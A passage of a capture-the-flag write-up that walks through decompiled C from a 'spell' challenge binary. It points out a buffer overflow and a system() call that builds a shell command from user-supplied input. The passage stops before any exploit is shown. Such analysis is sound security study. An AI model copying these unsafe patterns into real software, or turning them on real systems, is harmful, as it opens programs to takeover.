&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[-] This spell is not quiet effective, thus it will not be saved!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_004020af);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see there that there is a clear buffer overflow. Whatever happens before during the execution, the function tries to fit 600 bytes in a 32 bytes buffer which obviously results in an overflow. Now that we have a way to redirect the execution, let&amp;rsquo;s see how we can fill that buffer being copied with what we want.&lt;/p&gt;
&lt;p&gt;At the initialization of the main, the buffer is being &lt;code&gt;bzero&lt;/code&gt;ed and we can see that then the first 96 bytes of the output of &lt;code&gt;spell_read&lt;/code&gt; are copied in this buffer. Here is &lt;code&gt;spell_read&lt;/code&gt; decompiled :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spell_read&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; cmp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;str;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;__stream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unzip spell.zip&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  __stream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;spell.txt&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (__stream &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[-] There is no such file!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_004020af);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  fread(str,&lt;span style=&#34;color:#ae81ff&#34;&gt;399&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,__stream);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  cmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strncmp(str,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf0\x9f\x91\x93&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cmp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strncmp(str &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe2\x9a\xa1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cmp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      close((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)__stream);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; str;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[-] Your file does not have the signature of the boy who lived!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_004020af);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x520&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That shows us that the output string of the function will be the 399 first bytes of &lt;code&gt;spell.txt&lt;/code&gt; but the function will only return if the first 7 bytes are the following : 0xf09f9193e29aa1. Another interesting thing is the call &lt;code&gt;system(&amp;quot;unzip spell.zip&amp;quot;)&lt;/code&gt;. It explains the output that we got when we tried to read a spell. Let&amp;rsquo;s see what &lt;code&gt;spell_upload&lt;/code&gt; does now, it seems to be the function that will control the content of &lt;code&gt;spell.zip&lt;/code&gt;. Here is its decompiled code :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spell_upload&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  size_t sVar1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar2;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  undefined8 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;puVar3;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;puVar4;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong local_1228 [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  undefined2 auStack4624 [&lt;span style=&#34;color:#ae81ff&#34;&gt;2035&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cStack553;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  undefined8 local_228;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  undefined8 local_220;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  undefined8 local_218 [&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;local_20;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong local_18;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong local_10;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  local_228 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  local_220 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  puVar3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; local_218;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3e&lt;/span&gt;; lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;puVar3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    puVar3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puVar3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  local_1228[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  local_1228[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  puVar4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; local_1228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1fe&lt;/span&gt;; lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lVar2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;puVar4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    puVar4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puVar4 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Enter file (it will be named spell.zip): &amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  local_18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ff&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cStack553)[local_18] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  local_10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;( true ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (local_18 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; local_10) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      local_1228[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; local_1228[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff00000000000000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27206f686365&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      strcat((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)local_1228,(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      sVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)local_1228);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(undefined8 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)local_1228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sVar1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65736162207c2027&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(undefined8 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)local_1228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sVar1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x203e20642d203436&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(undefined8 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)auStack4624 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (sVar1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x697a2e6c6c657073&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(undefined2 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)auStack4624 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sVar1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      system((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)local_1228);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      local_20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;spell.zip&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (local_20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[-] There is no such file!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_004020af);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Spell has been added!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00402032,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_0040202a);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      close((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)local_20);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((((&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
